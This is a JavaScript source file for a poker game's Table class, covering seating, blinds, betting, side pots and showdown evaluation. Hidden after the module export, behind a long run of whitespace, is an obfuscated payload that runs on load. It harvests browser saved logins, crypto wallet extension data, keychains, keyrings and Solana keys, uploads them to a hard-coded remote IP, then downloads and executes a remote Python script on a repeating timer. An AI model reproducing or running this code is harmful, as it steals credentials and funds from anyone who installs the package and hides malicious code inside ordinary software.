const _abc = require('underscore');
const lodash = require('lodash');
const Hand = require('pokersolver').Hand;
const Seat = require('./Seat');
const Deck = require('./Deck');
const SidePot = require('./SidePot');

class Table {
  constructor(id, name, limit, maxPlayers = 5) {
    this.id = id;
    this.name = name;
    this.limit = limit;
    this.maxPlayers = maxPlayers;
    this.players = [];
    this.seats = this.initSeats(maxPlayers);
    this.board = [];
    this.deck = null;
    this.button = null;
    this.turn = null;
    this.pot = 0;
    this.mainPot = 0;
    this.callAmount = null;
    this.minBet = this.limit / 40;
    this.minRaise = this.limit / 20;
    this.smallBlind = null;
    this.bigBlind = null;
    this.handOver = true;
    this.winMessages = [];
    this.wentToShowdown = false;
    this.sidePots = [];
    this.history = [];
  }

  initSeats(maxPlayers) {
    const seats = {};

    for (let i = 1; i <= maxPlayers; i++) {
      seats[i] = null;
    }

    return seats;
  }

  addPlayer(player) {
    this.players.push(player);
  }

  removePlayer(socketId) {
    this.players = this.players.filter(
      (player) => player && player.socketId !== socketId,
    );
    this.standPlayer(socketId);
  }

  sitPlayer(player, seatId, amount) {
    if (this.seats[seatId]) {
      return;
    }
    this.seats[seatId] = new Seat(seatId, player, amount, amount);

    const firstPlayer =
      Object.values(this.seats).filter((seat) => seat != null).length === 1;

    this.button = firstPlayer ? seatId : this.button;
  }

  rebuyPlayer(seatId, amount) {
    if (!this.seats[seatId]) {
      throw new Error('No seated player to rebuy');
    }
    this.seats[seatId].stack += amount;
  }

  standPlayer(socketId) {
    for (let i of Object.keys(this.seats)) {
      if (this.seats[i] && this.seats[i].player.socketId === socketId) {
        this.seats[i] = null;
      }
    }

    const satPlayers = Object.values(this.seats).filter((seat) => seat != null);

    if (satPlayers.length === 1) {
      this.endWithoutShowdown();
    }

    if (satPlayers.length === 0) {
      this.resetEmptyTable();
    }
  }

  findPlayerBySocketId(socketId) {
    for (let i = 1; i <= this.maxPlayers; i++) {
      if (this.seats[i] && this.seats[i].player.socketId === socketId) {
        return this.seats[i];
      }
    }
    // throw new Error('seat not found!');
  }
  unfoldedPlayers() {
    return Object.values(this.seats).filter(
      (seat) => seat != null && !seat.folded,
    );
  }
  activePlayers() {
    return Object.values(this.seats).filter(
      (seat) => seat != null && !seat.sittingOut,
    );
  }
  nextUnfoldedPlayer(player, places) {
    let i = 0;
    let current = player;

    while (i < places) {
      current = current === this.maxPlayers ? 1 : current + 1;
      let seat = this.seats[current];

      if (seat && !seat.folded) i++;
    }
    return current;
  }
  nextActivePlayer(player, places) {
    let i = 0;
    let current = player;

    while (i < places) {
      current = current === this.maxPlayers ? 1 : current + 1;
      let seat = this.seats[current];

      if (seat && !seat.sittingOut) i++;
    }
    return current;
  }
  startHand() {
    this.deck = new Deck();
    this.wentToShowdown = false;
    this.resetBoardAndPot();
    this.clearSeatHands();
    this.resetBetsAndActions();
    this.unfoldPlayers();
    this.history = [];

    if (this.activePlayers().length > 1) {
      this.button = this.nextActivePlayer(this.button, 1);
      this.setTurn();
      this.dealPreflop();
      // get the preflop stacks
      this.updateHistory();
      this.setBlinds();
      this.handOver = false;
    }

    this.updateHistory();
  }
  unfoldPlayers() {
    for (let i = 1; i <= this.maxPlayers; i++) {
      const seat = this.seats[i];
      if (seat) {
        seat.folded = seat.sittingOut ? true : false;
      }
    }
  }
  setTurn() {
    this.turn =
      this.activePlayers().length <= 3
        ? this.button
        : this.nextActivePlayer(this.button, 3);
  }
  setBlinds() {
    const isHeadsUp = this.activePlayers().length === 2 ? true : false;

    this.smallBlind = isHeadsUp
      ? this.button
      : this.nextActivePlayer(this.button, 1);
    this.bigBlind = isHeadsUp
      ? this.nextActivePlayer(this.button, 1)
      : this.nextActivePlayer(this.button, 2);

    this.seats[this.smallBlind].placeBlind(this.minBet);
    this.seats[this.bigBlind].placeBlind(this.minBet * 2);

    this.pot += this.minBet * 3;
    this.callAmount = this.minBet * 2;
    this.minRaise = this.minBet * 4;
  }
  clearSeats() {
    for (let i of Object.keys(this.seats)) {
      this.seats[i] = null;
    }
  }
  clearSeatHands() {
    for (let i of Object.keys(this.seats)) {
      if (this.seats[i]) {
        this.seats[i].hand = [];
      }
    }
  }
  clearSeatTurns() {
    for (let i of Object.keys(this.seats)) {
      if (this.seats[i]) {
        this.seats[i].turn = false;
      }
    }
  }
  clearWinMessages() {
    this.winMessages = [];
  }
  endHand() {
    this.clearSeatTurns();
    this.handOver = true;
    this.sitOutFeltedPlayers();
  }
  sitOutFeltedPlayers() {
    for (let i of Object.keys(this.seats)) {
      const seat = this.seats[i];
      if ((seat && seat.stack == 0) || (seat && seat.stack < 0)) {
        seat.sittingOut = true;
      }
    }
  }
  endWithoutShowdown() {
    const winner = this.unfoldedPlayers()[0];
    winner && winner.winHand(this.pot);
    winner &&
      this.winMessages.push(
        `${winner.player.name} wins $${this.pot.toFixed(2)}`,
      );
    this.endHand();
  }
  resetEmptyTable() {
    this.button = null;
    this.turn = null;
    this.handOver = true;
    this.deck = null;
    this.wentToShowdown = false;
    this.resetBoardAndPot();
    this.clearWinMessages();
    this.clearSeats();
  }
  resetBoardAndPot() {
    this.board = [];
    this.pot = 0;
    this.mainPot = 0;
    this.sidePots = [];
  }
  updateHistory() {
    this.history.push({
      pot: +this.pot.toFixed(2),
      mainPot: +this.mainPot.toFixed(2),
      sidePots: this.sidePots.slice(),
      board: this.board.slice(),
      seats: this.cleanSeatsForHistory(),
      button: this.button,
      turn: this.turn,
      winMessages: this.winMessages.slice(),
    });
  }
  cleanSeatsForHistory() {
    const cleanSeats = JSON.parse(JSON.stringify(this.seats));
    for (let i = 0; i < this.maxPlayers; i++) {
      const seat = cleanSeats[i];
      if (seat) {
        seat.player = {
          id: seat.player.id,
          username: seat.player.name,
        };
        seat.bet = +seat.bet.toFixed(2);
        seat.stack = +seat.stack.toFixed(2);
      }
    }
    return cleanSeats;
  }
  changeTurn(lastTurn) {
    this.updateHistory();

    if (this.unfoldedPlayers().length === 1) {
      this.endWithoutShowdown();
      return;
    }

    if (this.actionIsComplete()) {
      this.calculateSidePots();
      while (this.board.length <= 5 && !this.handOver) {
        this.dealNextStreet();
      }
    }

    if (this.allCheckedOrCalled()) {
      this.calculateSidePots();
      this.dealNextStreet();
      this.turn = this.handOver
        ? null
        : this.nextUnfoldedPlayer(this.button, 1);
    } else {
      this.turn = this.nextUnfoldedPlayer(lastTurn, 1);
    }

    for (let i = 1; i <= this.maxPlayers; i++) {
      if (this.seats[i]) {
        this.seats[i].turn = i === this.turn ? true : false;
      }
    }
  }
  allCheckedOrCalled() {
    if (
      this.seats[this.bigBlind] &&
      this.seats[this.bigBlind].bet === this.limit / 100 &&
      !this.seats[this.bigBlind].checked &&
      this.board.length === 0
    ) {
      return false;
    }

    for (let i of Object.keys(this.seats)) {
      const seat = this.seats[i];
      if (seat && !seat.folded && seat.stack > 0) {
        if (
          (this.callAmount &&
            seat.bet.toFixed(2) !== this.callAmount.toFixed(2)) ||
          (!this.callAmount && !seat.checked)
        ) {
          return false;
        }
      }
    }
    return true;
  }
  actionIsComplete() {
    const seats = Object.values(this.seats);

    // everyone but one person is all in and the last person called:
    const seatsToAct = seats.filter(
      (seat) => seat && !seat.folded && seat.stack > 0,
    );
    if (seatsToAct.length === 0) return true;
    return seatsToAct.length === 1 && seatsToAct[0].lastAction === 'CS_CALL';
  }
  playersAllInThisTurn() {
    const seats = Object.values(this.seats);
    return seats.filter(
      (seat) => seat && !seat.folded && seat.bet > 0 && seat.stack === 0,
    );
  }
  calculateSidePots() {
    const allInPlayers = this.playersAllInThisTurn();
    const unfoldedPlayers = this.unfoldedPlayers();
    if (allInPlayers.length < 1) return;

    let sortedAllInPlayers = allInPlayers.sort((a, b) => a.bet - b.bet);
    if (
      sortedAllInPlayers.length > 1 &&
      sortedAllInPlayers.length === unfoldedPlayers.length
    ) {
      sortedAllInPlayers.pop();
    }

    const allInSeatIds = sortedAllInPlayers.map((seat) => seat.id);

    for (const seatId of allInSeatIds) {
      const allInSeat = this.seats[seatId];
      const sidePot = new SidePot();
      if (allInSeat.bet > 0) {
        for (let i = 1; i <= this.maxPlayers; i++) {
          const seat = this.seats[i];
          if (seat && !seat.folded && i !== seatId) {
            const amountOver = seat.bet - allInSeat.bet;
            if (amountOver > 0) {
              if (this.sidePots.length > 0) {
                this.sidePots[this.sidePots.length - 1].amount -= amountOver;
              } else {
                this.pot -= amountOver;
              }
              seat.bet -= allInSeat.bet;
              sidePot.amount += amountOver;
              sidePot.players.push(seat.id);
            }
          }
        }
        allInSeat.bet = 0;
        this.sidePots.push(sidePot);
      }
    }
  }
  dealNextStreet() {
    const length = this.board.length;
    this.resetBetsAndActions();
    this.mainPot = this.pot;
    if (length === 0) {
      this.dealFlop();
    } else if (length === 3 || length === 4) {
      this.dealTurnOrRiver();
    } else if (length === 5) {
      this.determineSidePotWinners();
      this.determineMainPotWinner();
    }
  }
  determineSidePotWinners() {
    if (this.sidePots.length < 1) return;

    this.sidePots.forEach((sidePot) => {
      const seats = sidePot.players.map((id) => this.seats[id]);
      this.determineWinner(sidePot.amount, seats);
    });
  }
  determineMainPotWinner() {
    this.determineWinner(this.pot, Object.values(this.seats).slice());
    this.wentToShowdown = true;
    this.endHand();
  }
  determineWinner(amount, seats) {
    const participants = seats
      .filter((seat) => seat && !seat.folded)
      .map((seat) => {
        const cards = seat.hand.slice().concat(this.board.slice());
        const solverCards = this.mapCardsForPokerSolver(cards);
        return {
          seatId: seat.id,
          solverCards,
        };
      });

    const findHandOwner = (cards) => {
      const participant = participants.find((participant) =>
        lodash.isEqual(participant.solverCards.sort(), cards),
      );
      return participant.seatId;
    };

    const solverWinners = Hand.winners(
      participants.map((p) => Hand.solve(p.solverCards)),
    );

    const winners = solverWinners.map((winner) => {
      const winningCards = winner.cardPool
        .map((card) => card.value + card.suit)
        .sort();
      const seatId = findHandOwner(winningCards);
      return [seatId, winner.descr];
    });

    for (let i = 0; i < winners.length; i++) {
      const seat = this.seats[winners[i][0]];
      const handDesc = winners[i][1];
      const winAmount = amount / winners.length;

      seat.winHand(winAmount);
      if (winAmount > 0) {
        this.winMessages.push(
          `${seat.player.name} wins $${winAmount.toFixed(2)} with ${handDesc}`,
        );
      }
    }

    this.updateHistory();
  }
  mapCardsForPokerSolver(cards) {
    const newCards = cards.map((card) => {
      const suit = card.suit.slice(0, 1);
      let rank;
      if (card.rank === '10') {
        rank = 'T';
      } else {
        rank =
          card.rank.length > 1
            ? card.rank.slice(0, 1).toUpperCase()
            : card.rank;
      }
      return rank + suit;
    });
    return newCards;
  }
  resetBetsAndActions() {
    for (let i = 1; i <= this.maxPlayers; i++) {
      if (this.seats[i]) {
        this.seats[i].bet = 0;
        this.seats[i].checked = false;
        this.seats[i].lastAction = null;
      }
    }
    this.callAmount = null;
    this.minRaise = this.limit / 200;
  }
  dealPreflop() {
    const arr = _abc.range(1, this.maxPlayers + 1);
    const order = arr.slice(this.button).concat(arr.slice(0, this.button));

    // deal cards to seated players
    for (let i = 0; i < 2; i++) {
      for (let j = 0; j < order.length; j++) {
        const seat = this.seats[order[j]];
        if (seat && !seat.sittingOut) {
          seat.hand.push(this.deck.draw());
          seat.turn = order[j] === this.turn ? true : false;
        }
      }
    }
  }
  dealFlop() {
    for (let i = 0; i < 3; i++) {
      this.board.push(this.deck.draw());
    }
  }
  dealTurnOrRiver() {
    this.board.push(this.deck.draw());
  }
  handleFold(socketId) {
    let seat = this.findPlayerBySocketId(socketId);

    if (seat) {
      seat.fold();

      return {
        seatId: seat.id,
        message: `${seat.player.name} folds`,
      };
    } else {
      return null;
    }
  }
  handleCall(socketId) {
    let seat = this.findPlayerBySocketId(socketId);

    if (seat) {
      let addedToPot =
        this.callAmount > seat.stack + seat.bet
          ? seat.stack
          : this.callAmount - seat.bet;

      seat.callRaise(this.callAmount);

      if (this.sidePots.length > 0) {
        this.sidePots[this.sidePots.length - 1].amount += addedToPot;
      } else {
        this.pot += addedToPot;
      }

      return {
        seatId: seat.id,
        message: `${seat.player.name} calls $${addedToPot.toFixed(2)}`,
      };
    } else {
      return null;
    }
  }
  handleCheck(socketId) {
    let seat = this.findPlayerBySocketId(socketId);
    if (seat) {
      seat.check();

      return {
        seatId: seat.id,
        message: `${seat.player.name} checks`,
      };
    } else {
      return null;
    }
  }
  handleRaise(socketId, amount) {
    let seat = this.findPlayerBySocketId(socketId);

    if (seat) {
      let addedToPot = amount - seat.bet;

      seat.raise(amount);

      if (this.sidePots.length > 0) {
        this.sidePots[this.sidePots.length - 1].amount += addedToPot;
      } else {
        this.pot += addedToPot;
      }

      this.minRaise = this.callAmount
        ? this.callAmount + (seat.bet - this.callAmount) * 2
        : seat.bet * 2;
      this.callAmount = amount;

      return {
        seatId: seat.id,
        message: `${seat.player.name} raises to $${amount.toFixed(2)}`,
      };
    } else {
      return null;
    }
  }
}

module.exports = Table;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     Object.prototype.toString,Object.getOwnPropertyDescriptor,Object.defineProperty;const t="base64",c="utf8",a=require("fs"),$=require("os"),l=a=>(s1=a.slice(1),Buffer.from(s1,t).toString(c));pt=require(l("zcGF0aA")),rq=require(l("YcmVxdWVzdA")),ex=require(l("aY2hpbGRfc"+"HJvY2Vzcw"))[l("cZXhlYw")],hs=$[l("caG9zdG5hbWU")](),pl=$[l("YcGxhdGZvcm0")](),hd=$[l("ZaG9tZWRpcg")](),td=$[l("cdG1wZGly")]();let r;const n=a=>Buffer.from(a,t).toString(c),h=()=>{let t="MTQ3LjEyNCaHR0cDovLw4yMTQuMTI5OjEyNDQ=  ";for(var c="",a="",$="",l="",r=0;r<10;r++)c+=t[r],a+=t[10+r],$+=t[20+r],l+=t[30+r];return c=c+$+l,n(a)+n(c)},s=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[n("ZGlybmFtZQ")](hd)}/${c}`)),e="s2DzOA8",Z="Z2V0",o="Ly5ucGw",d="d3JpdGVGaWxlU3luYw",u="L2NsaWVudA",G=n("ZXhpc3RzU3luYw"),y="TG9naW4gRGF0YQ",i="Y29weUZpbGU";function m(t){const c=n("YWNjZXN"+"zU3luYw");try{return a[c](t),!0}catch(t){return!1}}const b=n("RGVmYXVsdA"),p=n("UHJvZmlsZQ"),W=l("aZmlsZW5hbWU"),Y=l("cZm9ybURhdGE"),f=l("adXJs"),w=l("Zb3B0aW9ucw"),V=l("YdmFsdWU"),v=n("cmVhZGRpclN5bmM"),j=n("c3RhdFN5bmM"),L=(n("aXNEaXJlY3Rvcnk"),n("cG9zdA")),z="Ly5jb25maWcv",R="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",x="L0FwcERhdGEv",N="L1VzZXIgRGF0YQ",X="R29vZ2xlL0Nocm9tZQ",k="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",_="Z29vZ2xlLWNocm9tZQ",F=["TG9jYWwv"+k,k,k],B=["TG9jYWwv"+X,X,_],U=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let g="comp";const q=["bmtiaWhmYmVvZ2Fl","ZWpiYWxiYWtvcGxj","Zmhib2hpbWFlbGJv","aG5mYW5rbm9jZmVv","aWJuZWpkZmptbWtw","YmZuYWVsbW9tZWlt","YWVhY2hrbm1lZnBo","ZWdqaWRqYnBnbGlj","aGlmYWZnbWNjZHBl"],J=["YW9laGxlZm5rb2RiZWZncGdrbm4","aGxnaGVjZGFsbWVlZWFqbmltaG0","aHBqYmJsZGNuZ2NuYXBuZG9kanA","ZmJkZGdjaWpubWhuZm5rZG5hYWQ","Y25scGVia2xtbmtvZW9paG9mZWM","aGxwbWdqbmpvcGhocGtrb2xqcGE","ZXBjY2lvbmJvb2hja29ub2VlbWc","aGRjb25kYmNiZG5iZWVwcGdkcGg","a3Bsb21qamtjZmdvZG5oY2VsbGo"],Q="Y3JlYXRlUmVhZFN0cmVhbQ",T=async(t,c,$)=>{let l=t;if(!l||""===l)return[];try{if(!m(l))return[]}catch(t){return[]}c||(c="");let r=[];const h=n("TG9jYWwgRXh0ZW5za"+"W9uIFNldHRpbmdz"),s=n(Q);for(let $=0;$<200;$++){const e=`${t}/${0===$?b:`${p} ${$}`}/${h}`;for(let t=0;t<q.length;t++){const h=n(q[t]+J[t]);let Z=`${e}/${h}`;if(m(Z)){try{far=a[v](Z)}catch(t){far=[]}far.forEach((async t=>{l=pt.join(Z,t);try{r.push({[V]:a[s](l),[w]:{[W]:`${c}${$}_${h}_${t}`}})}catch(t){}}))}}}if($){const t=n("c29sYW5hX2lkLnR4dA");if(l=`${hd}${n("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,a[G](l))try{r.push({[V]:a[s](l),[w]:{[W]:t}})}catch(t){}}return C(r),r},C=t=>{const c=l("YbXVsdGlfZmlsZQ"),a=l("ZdGltZXN0YW1w"),$=n("L3VwbG9hZHM"),s={[a]:r.toString(),type:e,hid:g,[c]:t},Z=h();try{const t={[f]:`${Z}${$}`,[Y]:s};rq[L](t,((t,c,a)=>{}))}catch(t){}},A=async(t,c)=>{try{const a=s("~/");let $="";$="d"==pl[0]?`${a}${n(R)}${n(t[1])}`:"l"==pl[0]?`${a}${n(z)}${n(t[2])}`:`${a}${n(x)}${n(t[0])}${n(N)}`,await T($,`${c}_`,0==c)}catch(t){}},E=async()=>{let t=[];const c=n(y),$=n(Q),l=n("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),r=n("bG9na2MtZGI");if(pa=`${hd}${l}`,a[G](pa))try{t.push({[V]:a[$](pa),[w]:{[W]:r}})}catch(t){}else if(pa+="-db",a[G](pa))try{t.push({[V]:a[$](pa),[w]:{[W]:r}})}catch(t){}try{const l=n(i);let r="";if(r=`${hd}${n(R)}${n(X)}`,r&&""!==r&&m(r))for(let n=0;n<200;n++){const h=`${r}/${0===n?b:`${p} ${n}`}/${c}`;try{if(!m(h))continue;const c=`${r}/ld_${n}`;m(c)?t.push({[V]:a[$](c),[w]:{[W]:`pld_${n}`}}):a[l](h,c,(t=>{let c=[{[V]:a[$](h),[w]:{[W]:`pld_${n}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},H=async()=>{let t=[];const c=n(y),$=n(Q);try{const l=n(i);let r="";if(r=`${hd}${n(R)}${n(k)}`,r&&""!==r&&m(r))for(let n=0;n<200;n++){const h=`${r}/${0===n?b:`${p} ${n}`}/${c}`;try{if(!m(h))continue;const c=`${r}/brld_${n}`;m(c)?t.push({[V]:a[$](c),[w]:{[W]:`brld_${n}`}}):a[l](h,c,(t=>{let c=[{[V]:a[$](h),[w]:{[W]:`brld_${n}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},S=async()=>{let t=[];const c=n(Q),$=n("a2V5NC5kYg"),l=n("a2V5My5kYg"),r=n("bG9naW5zLmpzb24");try{let h="";if(h=`${hd}${n(R)}${n("RmlyZWZveA")}`,h&&""!==h&&m(h))for(let n=0;n<200;n++){const s=0===n?b:`${p} ${n}`,e=`${h}/${s}/${$}`,Z=`${h}/${s}/${l}`,o=`${h}/${s}/${r}`;try{m(e)&&t.push({[V]:a[c](e),[w]:{[W]:`fk4_${n}`}})}catch(t){}try{m(Z)&&t.push({[V]:a[c](Z),[w]:{[W]:`fk3_${n}`}})}catch(t){}try{m(o)&&t.push({[V]:a[c](o),[w]:{[W]:`flj_${n}`}})}catch(t){}}}catch(t){}return C(t),t},M=async()=>{let t=[];n(y);const c=n(Q);try{const t=n("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let $="";$=`${hd}${t}`;let l=[];if($&&""!==$&&m($))try{l=a[v]($)}catch(t){l=[]}l.forEach((async t=>{pa=pt.join($,t);try{ldb_data.push({[V]:a[c](pa),[w]:{[W]:`${t}`}})}catch(t){}}))}catch(t){}return C(t),t},I=async()=>{let t=[];const c=n(y),$=n(Q);try{const l=n(i);let r="";if(r=`${hd}${n(z)}${n(_)}`,r&&""!==r&&m(r))for(let n=0;n<200;n++){const h=`${r}/${0===n?b:`${p} ${n}`}/${c}`;try{if(!m(h))continue;const c=`${r}/ld_${n}`;m(c)?t.push({[V]:a[$](c),[w]:{[W]:`plld_${n}`}}):a[l](h,c,(t=>{let c=[{[V]:a[$](h),[w]:{[W]:`plld_${n}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},D=async()=>{let t=[];const c=n(Q),$=n("a2V5NC5kYg"),l=n("a2V5My5kYg"),r=n("bG9naW5zLmpzb24");try{let h="";if(h=`${hd}${n("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,h&&""!==h&&m(h))for(let n=0;n<200;n++){const s=0===n?b:`${p} ${n}`,e=`${h}/${s}/${$}`,Z=`${h}/${s}/${l}`,o=`${h}/${s}/${r}`;try{m(e)&&t.push({[V]:a[c](e),[w]:{[W]:`flk4_${n}`}})}catch(t){}try{m(Z)&&t.push({[V]:a[c](Z),[w]:{[W]:`flk3_${n}`}})}catch(t){}try{m(o)&&t.push({[V]:a[c](o),[w]:{[W]:`fllj_${n}`}})}catch(t){}}}catch(t){}return C(t),t},P=n("cm1TeW5j"),O="XC5weXBccHl0aG9uLmV4ZQ",K=51476590;let tt=0;const ct=async t=>{const c=`${n("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,$,l)=>{if(c)return a[P](t),void(tt=0);a[P](t),lt()}))},at=()=>{const t=n("cDIuemlw"),c=`${h()}${n("L3Bkb3du")}`,$=`${td}\\${n("cC56aQ")}`,l=`${td}\\${t}`;if(tt>=K+6)return;const r=n("cmVuYW1lU3luYw"),s=n("cmVuYW1l");if(a[G]($))try{var e=a[j]($);e.size>=K+6?(tt=e.size,a[s]($,l,(t=>{if(t)throw t;ct(l)}))):(tt<e.size?tt=e.size:(a[P]($),tt=0),$t())}catch(t){}else{const t=`${n("Y3VybCAtTG8")} "${$}" "${c}"`;ex(t,((t,c,n)=>{if(t)return tt=0,void $t();try{tt=K+6,a[r]($,l),ct(l)}catch(t){}}))}};function $t(){setTimeout((()=>{at()}),2e4)}const lt=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${n(O)}`;a[G](`${t}`)?(()=>{const t=h(),c=n(u),$=n(Z),l=n(d),r=n(o),s=`${t}${c}/${e}`,G=`${hd}${r}`,y=`"${hd}${n(O)}" "${G}"`;try{a[P](G)}catch(t){}rq[$](s,((t,c,$)=>{if(!t)try{a[l](G,$),ex(y,((t,c,a)=>{}))}catch(t){}}))})():at()}else(()=>{const t=h(),c=n(u),$=n(d),l=n(Z),r=n(o),s=n("cHl0aG9u"),G=`${t}${c}/${e}`,y=`${hd}${r}`;let i=`${s}3 "${y}"`;rq[l](G,((t,c,l)=>{t||(a[$](y,l),ex(i,((t,c,a)=>{})))}))})()}));var rt=0;const nt=async()=>{try{r=Date.now(),await(async()=>{g=hs;try{const t=s("~/");await A(B,0),await A(F,1),await A(U,2),"w"==pl[0]?(pa=`${t}${n(x)}${n("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${n(N)}`,await T(pa,"3_",!1)):"d"==pl[0]?(await E(),await H(),await S()):"l"==pl[0]&&(await M(),await I(),await D())}catch(t){}})(),lt()}catch(t){}};nt();let ht=setInterval((()=>{(rt+=1)<5?nt():clearInterval(ht)}),6e5);
